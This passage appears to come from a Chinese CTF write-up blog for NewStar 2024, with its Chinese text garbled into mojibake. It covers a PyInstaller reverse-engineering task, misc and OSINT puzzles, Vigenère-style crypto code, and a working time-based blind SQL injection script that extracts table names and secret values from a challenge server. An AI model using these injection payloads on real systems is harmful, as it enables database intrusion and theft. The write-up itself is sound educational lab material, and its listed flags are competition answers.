</span></span><span style=display:flex><span>    print(flag_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>RequestException:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pass</span>
</span></span></code></pre></div><h2 id=re-2>Re</h2><h3 id=pangbai-è¿‡å®¶å®¶3>PangBai è¿‡å®¶å®¶ï¼ˆ3ï¼‰</h3><p>å¤§æ¦‚æµç¨‹å‚ç…§<a href=https://www.cnblogs.com/demo41/p/18226496>Pyinstalleræ‰“åŒ…exeçš„åç¼–è¯‘â€”â€”LitCTF 2024ï¼ˆå…¬å¼€èµ›é“ï¼‰ezpythonï¼ï¼ï¼ï¼ï¼ - demo41 - åšå®¢å›­ (cnblogs.com)</a></p><p>é¦–å…ˆæŠŠexeè¿›è¡Œè§£åŒ…å˜æˆpycæ–‡ä»¶ï¼Œç”¨è¿™ä¸ªé¡¹ç›®ï¼Œæˆ–è€…æœ‰åœ¨çº¿ç½‘ç«™</p><p><a href=https://github.com/extremecoders-re/pyinstxtractor>extremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com)</a>ï¼Œå¾—åˆ°åŒåçš„pycï¼Œç„¶åå†æ‰¾ä¸ªç½‘ç«™åç¼–è¯‘æ–‡ä»¶</p><p><a href="https://pylingual.io/view_chimera?identifier=f63fac43765afc0144c06a74f7b63067d41bad9a413bc7f0369948c9ea30fd9f">åç¼–è¯‘</a>ï¼Œå¾—åˆ°æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Decompiled with PyLingual (https://pylingual.io)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Internal filename: NotNormalExe.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Bytecode version: 3.12.0rc2 (3531)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Welcome to NewStar~&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Please input the flag:&#39;</span>)
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> [<span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>66</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>121</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>80</span>, <span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>68</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>79</span>]
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;NewStar2024&#39;</span>
</span></span><span style=display:flex><span>input <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#39;&gt; &#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len(input) <span style=color:#f92672>!=</span> len(enc):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;Wrong flag, try again!&#39;</span>)
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(input)):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> enc[i] <span style=color:#f92672>!=</span> ord(input[i]) <span style=color:#f92672>^</span> ord(key[i <span style=color:#f92672>%</span> len(key)]):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#39;Wrong flag, try again!&#39;</span>)
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Correct flag!&#39;</span>)
</span></span></code></pre></div><p>è§£å¯†å¾—åˆ°flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Given encrypted values</span>
</span></span><span style=display:flex><span>enc <span style=color:#f92672>=</span> [<span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>22</span>, <span style=color:#ae81ff>52</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>56</span>, <span style=color:#ae81ff>66</span>, <span style=color:#ae81ff>71</span>, <span style=color:#ae81ff>111</span>, <span style=color:#ae81ff>121</span>, <span style=color:#ae81ff>90</span>, <span style=color:#ae81ff>33</span>, <span style=color:#ae81ff>18</span>, <span style=color:#ae81ff>40</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>80</span>, <span style=color:#ae81ff>28</span>, <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>68</span>, <span style=color:#ae81ff>83</span>, <span style=color:#ae81ff>88</span>, <span style=color:#ae81ff>34</span>, <span style=color:#ae81ff>86</span>, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>35</span>, <span style=color:#ae81ff>82</span>, <span style=color:#ae81ff>67</span>, <span style=color:#ae81ff>3</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>79</span>]
</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;NewStar2024&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Decrypting the flag</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(enc)):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Compute the corresponding character</span>
</span></span><span style=display:flex><span>    char <span style=color:#f92672>=</span> chr(enc[i] <span style=color:#f92672>^</span> ord(key[i <span style=color:#f92672>%</span> len(key)]))
</span></span><span style=display:flex><span>    flag<span style=color:#f92672>.</span>append(char)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Join the list into a string</span>
</span></span><span style=display:flex><span>decrypted_flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(flag)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;Decrypted flag:&#39;</span>, decrypted_flag)
</span></span><span style=display:flex><span><span style=color:#75715e>#  flag{Y0u_Know_Py1nstall3r_W311!}</span>
</span></span></code></pre></div><h2 id=misc-2>Misc</h2><h3 id=bgmåäº†å—>BGMåäº†å—ï¼Ÿ</h3><p>ç”¨audæ£€æµ‹ä¸€ä¸‹ï¼Œåœ¨æœ€ååç§’å†…æœ‰ç”µè¯æ’­éŸ³ï¼Œå¯ä»¥æå–è¿™æ®µéŸ³é¢‘ï¼Œç”¨å·¥å…·å¾—åˆ°</p><p><img alt=38 loading=lazy src=/posts/ctf/newstar2024/38.png></p><h3 id=amazinggame>AmazingGame</h3><p>jebç›´æ¥ç§’ï¼Œæ¸¸æˆæŒºå¥½ç©çš„ï¼Œbase64è§£å¯†</p><p><img alt=39 loading=lazy src=/posts/ctf/newstar2024/39.png></p><h3 id=osint-master>OSINT-MASTER</h3><p>é£æœºå®šä½å¯ä»¥çœ‹åˆ°æ˜¯B-2419,æŸ¥ä¸€ä¸‹é£æœºçš„èˆªç­çš„é£è¡Œæ—¶é—´å®šä½å…·ä½“èˆªç­</p><p><img alt=41 loading=lazy src=/posts/ctf/newstar2024/41.png></p><p>çœ‹ä¸€ä¸‹å¯¹åº”çš„èˆªç­</p><p><img alt=40 loading=lazy src=/posts/ctf/newstar2024/40.png></p><p>æ ¹æ®å›¾ç‰‡ä¸‹é¢æœ‰ä¸ªå¼¯é“æ²³ç®€å•å®šä½ä¸€ä¸‹æ˜¯æµå®å¸‚</p><p>flag{MU5156_æµå®å¸‚}</p><h3 id=ez_jai>ez_jai</h3><p>æµ‹è¯•äº†ä¸€ä¼šå‘ç°äº†èŠ±æ‹¬å·å¯ä»¥ç”¨<code>&lt;%%></code>è¿›è¡Œç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>user_code</span>() <span style=color:#f92672>&lt;%</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Hello, World!&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#f92672>%&gt;</span>
</span></span></code></pre></div><p><img alt=43 loading=lazy src=/posts/ctf/newstar2024/43.png></p><h2 id=crypto-2>Crypto</h2><h3 id=æ•…äº‹æ–°ç¼–1>æ•…äº‹æ–°ç¼–1</h3><p>å…ˆè§£å¯†ç»´å‰å°¼äºšå¯†ç ï¼Œæ ¹æ®åé¢çš„æ— åºå°¾çŒœæµ‹ä½æ•°</p><p><img alt=42 loading=lazy src=/posts/ctf/newstar2024/42.png></p><p>å¾—åˆ°ä¹‹åä¸€ç›´åœ¨å°è¯•ä½†æ˜¯ä¸€ç›´æ²¡è§£å‡ºæ¥ï¼Œæ˜æ˜¾æ˜¯å‡ºé¢˜äººé—®é¢˜ï¼Œæœ‰å­˜åœ¨ä¸€ä¸ªæ¢è¡Œç¬¦</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span>zen1  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>BEAUTIFUL IS BETTER THAN UGLY.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EXPLICIT IS BETTER THAN IMPLICIT.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SIMPLE IS BETTER THAN COMPLEX.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>COMPLEX IS BETTER THAN COMPLICATED.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>FLAT IS BETTER THAN NESTED.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SPARSE IS BETTER THAN DENSE.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>FLAGA IS VEGENERE
</span></span></span><span style=display:flex><span><span style=color:#e6db74>READABILITY COUNTS.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>SPECIAL CASES AREN&#39;T SPECIAL ENOUGH TO BREAK THE RULES.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ALTHOUGH PRACTICALITY BEATS PURITY.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ERRORS SHOULD NEVER PASS SILENTLY.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>UNLESS EXPLICITLY SILENCED.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>key1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SUBTITUTION&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>enc1</span>(plaintext, key):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>shift_char</span>(c, k):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> chr(((ord(c) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>+</span> (ord(k) <span style=color:#f92672>-</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>))) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>) <span style=color:#f92672>+</span> ord(<span style=color:#e6db74>&#39;A&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    plaintext <span style=color:#f92672>=</span> plaintext<span style=color:#f92672>.</span>upper()
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span>upper()
</span></span><span style=display:flex><span>    ciphertext <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    key_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> plaintext:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> char<span style=color:#f92672>.</span>isalpha():
</span></span><span style=display:flex><span>            ciphertext<span style=color:#f92672>.</span>append(shift_char(char, key[key_index <span style=color:#f92672>%</span> len(key)]))
</span></span><span style=display:flex><span>            key_index <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            ciphertext<span style=color:#f92672>.</span>append(char)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(ciphertext)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;enc = </span><span style=color:#ae81ff>\&#39;\&#39;\&#39;</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> enc1(zen1, key1)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#39;\&#39;\&#39;</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;flag{&#39;</span><span style=color:#f92672>+</span>md5(zen1<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()<span style=color:#f92672>.</span>encode()<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;}&#39;</span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><h3 id=æ•…äº‹æ–°ç¼–2>æ•…äº‹æ–°ç¼–2</h3><p>å‚ç…§1ä¹Ÿæ˜¯å…ˆè§£å†è§£</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span>zen2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>IN THE FACE OF AMBIGUITY, REFUSE THE TEMPTATION TO GUESS.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>THERE SHOULD BE ONE-- AND PREFERABLY ONLY ONE --OBVIOUS WAY TO DO IT.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ALTHOUGH THAT WAY MAY NOT BE OBVIOUS AT FIRST UNLESS YOU&#39;RE DUTCH.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>NOW IS BETTER THAN NEVER.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ALTHOUGH NEVER IS OFTEN BETTER THAN RIGHT NOW.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>IF THE IMPLEMENTATION IS HARD TO EXPLAIN, IT&#39;S A BAD IDEA.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>IF THE IMPLEMENTATION IS EASY TO EXPLAIN, IT MAY BE A GOOD IDEA.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>key2 <span style=color:#f92672>=</span><span style=color:#e6db74>&#39;supersubtitution&#39;</span>
</span></span><span style=display:flex><span>dict1 <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;A&#39;</span>: <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;B&#39;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#39;C&#39;</span>: <span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#39;D&#39;</span>: <span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#39;E&#39;</span>: <span style=color:#ae81ff>4</span>,
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#39;F&#39;</span>: <span style=color:#ae81ff>5</span>, <span style=color:#e6db74>&#39;G&#39;</span>: <span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#39;H&#39;</span>: <span style=color:#ae81ff>7</span>, <span style=color:#e6db74>&#39;I&#39;</span>: <span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#39;J&#39;</span>: <span style=color:#ae81ff>9</span>,
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#39;K&#39;</span>: <span style=color:#ae81ff>10</span>, <span style=color:#e6db74>&#39;L&#39;</span>: <span style=color:#ae81ff>11</span>, <span style=color:#e6db74>&#39;M&#39;</span>: <span style=color:#ae81ff>12</span>, <span style=color:#e6db74>&#39;N&#39;</span>: <span style=color:#ae81ff>13</span>, <span style=color:#e6db74>&#39;O&#39;</span>: <span style=color:#ae81ff>14</span>,
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#39;P&#39;</span>: <span style=color:#ae81ff>15</span>, <span style=color:#e6db74>&#39;Q&#39;</span>: <span style=color:#ae81ff>16</span>, <span style=color:#e6db74>&#39;R&#39;</span>: <span style=color:#ae81ff>17</span>, <span style=color:#e6db74>&#39;S&#39;</span>: <span style=color:#ae81ff>18</span>, <span style=color:#e6db74>&#39;T&#39;</span>: <span style=color:#ae81ff>19</span>,
</span></span><span style=display:flex><span>         <span style=color:#e6db74>&#39;U&#39;</span>: <span style=color:#ae81ff>20</span>, <span style=color:#e6db74>&#39;V&#39;</span>: <span style=color:#ae81ff>21</span>, <span style=color:#e6db74>&#39;W&#39;</span>: <span style=color:#ae81ff>22</span>, <span style=color:#e6db74>&#39;X&#39;</span>: <span style=color:#ae81ff>23</span>, <span style=color:#e6db74>&#39;Y&#39;</span>: <span style=color:#ae81ff>24</span>, <span style=color:#e6db74>&#39;Z&#39;</span>: <span style=color:#ae81ff>25</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dict2 <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>: <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#ae81ff>1</span>: <span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#ae81ff>2</span>: <span style=color:#e6db74>&#39;C&#39;</span>, <span style=color:#ae81ff>3</span>: <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#ae81ff>4</span>: <span style=color:#e6db74>&#39;E&#39;</span>,
</span></span><span style=display:flex><span>         <span style=color:#ae81ff>5</span>: <span style=color:#e6db74>&#39;F&#39;</span>, <span style=color:#ae81ff>6</span>: <span style=color:#e6db74>&#39;G&#39;</span>, <span style=color:#ae81ff>7</span>: <span style=color:#e6db74>&#39;H&#39;</span>, <span style=color:#ae81ff>8</span>: <span style=color:#e6db74>&#39;I&#39;</span>, <span style=color:#ae81ff>9</span>: <span style=color:#e6db74>&#39;J&#39;</span>,
</span></span><span style=display:flex><span>         <span style=color:#ae81ff>10</span>: <span style=color:#e6db74>&#39;K&#39;</span>, <span style=color:#ae81ff>11</span>: <span style=color:#e6db74>&#39;L&#39;</span>, <span style=color:#ae81ff>12</span>: <span style=color:#e6db74>&#39;M&#39;</span>, <span style=color:#ae81ff>13</span>: <span style=color:#e6db74>&#39;N&#39;</span>, <span style=color:#ae81ff>14</span>: <span style=color:#e6db74>&#39;O&#39;</span>,
</span></span><span style=display:flex><span>         <span style=color:#ae81ff>15</span>: <span style=color:#e6db74>&#39;P&#39;</span>, <span style=color:#ae81ff>16</span>: <span style=color:#e6db74>&#39;Q&#39;</span>, <span style=color:#ae81ff>17</span>: <span style=color:#e6db74>&#39;R&#39;</span>, <span style=color:#ae81ff>18</span>: <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#ae81ff>19</span>: <span style=color:#e6db74>&#39;T&#39;</span>,
</span></span><span style=display:flex><span>         <span style=color:#ae81ff>20</span>: <span style=color:#e6db74>&#39;U&#39;</span>, <span style=color:#ae81ff>21</span>: <span style=color:#e6db74>&#39;V&#39;</span>, <span style=color:#ae81ff>22</span>: <span style=color:#e6db74>&#39;W&#39;</span>, <span style=color:#ae81ff>23</span>: <span style=color:#e6db74>&#39;X&#39;</span>, <span style=color:#ae81ff>24</span>: <span style=color:#e6db74>&#39;Y&#39;</span>, <span style=color:#ae81ff>25</span>: <span style=color:#e6db74>&#39;Z&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>generate_key</span>(message, key):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(message)):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> message[i]<span style=color:#f92672>.</span>isalpha() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            key <span style=color:#f92672>+=</span> message[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> key
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>enc2</span>(message, key):
</span></span><span style=display:flex><span>    message <span style=color:#f92672>=</span> message<span style=color:#f92672>.</span>upper()
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span>upper()
</span></span><span style=display:flex><span>    key_new <span style=color:#f92672>=</span> generate_key(message, key)
</span></span><span style=display:flex><span>    cipher_text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> letter <span style=color:#f92672>in</span> message:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> letter<span style=color:#f92672>.</span>isalpha():
</span></span><span style=display:flex><span>            x <span style=color:#f92672>=</span> (dict1[letter]<span style=color:#f92672>+</span>dict1[key_new[i]]) <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>
</span></span><span style=display:flex><span>            i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            cipher_text <span style=color:#f92672>+=</span> dict2[x]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            cipher_text <span style=color:#f92672>+=</span> letter
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cipher_text
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;enc = </span><span style=color:#ae81ff>\&#39;\&#39;\&#39;</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> enc2(zen2, key2)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\&#39;\&#39;\&#39;</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;flag{&#39;</span><span style=color:#f92672>+</span>md5(zen2<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()<span style=color:#f92672>.</span>encode()<span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;}&#39;</span>
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><h1 id=week4>week4</h1><h2 id=web-3>web</h2><h3 id=blindsql2>blindsql2</h3><p>å…¶å®æˆ‘çš„week3å°±æ˜¯å¯¹çš„åªæ˜¯é»˜è®¤ä¸åŒ¹é…é™¤<code>_</code>çš„å­—ç¬¦å¯¼è‡´æˆ‘ä»¥ä¸ºçˆ†å‡ºæ¥çš„è¡¨åªæœ‰ä¸€ä¸ªï¼Œç°åœ¨ä¸Šä¸€ä¸‹è¿™å‘¨çš„è„šæœ¬å§ï¼Œfè„šæœ¬éœ€è¦å¤šè·‘å‡ æ¬¡æ‰èƒ½å‡ºå‡†ç¡®çš„flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>dicts <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_letters <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;_&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;-&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;{&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;}&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;,&#34;</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://eci-2ze1c97lhjoq1bd4ebwl.cloudeci1.ichunqiu.com/&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag_char</span>(index):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> dicts:
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;-1&#39;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;-1&#39;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\&#39;secrets\&#39;)),{index},1)like(&#39;{char}&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># id,secret_key,secret_value</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#æœ€ç»ˆæƒ…å†µ: i_want_a_girlfriend_i_want_to_beWa_good_ctfer_flag__b_cbb___b_f</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;-1&#39;||(if(mid((select(group_concat(secret_value))from(secrets)where((secret_value)like(&#39;flag%&#39;))),</span><span style=color:#e6db74>{</span>index<span style=color:#e6db74>}</span><span style=color:#e6db74>,1)like(&#39;</span><span style=color:#e6db74>{</span>char<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;),sleep(0.5),0))#&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5bc964f91}</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5b1364f91}</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#flag{2b4cbb60-b6ff-4e2f-ab20-e9c5b1964f91}</span>
</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;student_name&#39;</span>: payload}
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            start_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>url, params<span style=color:#f92672>=</span>params)
</span></span><span style=display:flex><span>            end_time <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
</span></span><span style=display:flex><span>            sub <span style=color:#f92672>=</span> end_time <span style=color:#f92672>-</span> start_time
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> sub <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0.5</span>:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> char
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>RequestException <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;è¯·æ±‚å¤±è´¥: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
